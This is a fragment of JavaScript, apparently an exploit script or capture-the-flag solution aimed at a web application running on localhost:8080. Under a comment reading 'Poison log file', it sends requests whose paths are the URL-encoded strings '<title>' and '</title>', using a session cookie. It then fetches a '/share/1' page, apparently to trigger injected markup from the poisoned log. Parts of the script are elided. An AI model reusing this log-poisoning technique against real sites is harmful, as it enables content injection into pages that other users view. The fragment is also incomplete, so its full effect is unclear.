...
let homeRsp = await fetch('http://localhost:8080/');
...
// Poison log file
await fetch('http://localhost:8080/' + encodeURIComponent('<title>'), { headers: { 'Cookie': cookie } });
await fetch('http://localhost:8080/' + encodeURIComponent('</title>'), { headers: { 'Cookie': cookie } });
...
let rsp2 = await fetch('http://localhost:8080/share/1', {
    headers: {
        'Cookie': cookie
    }
});
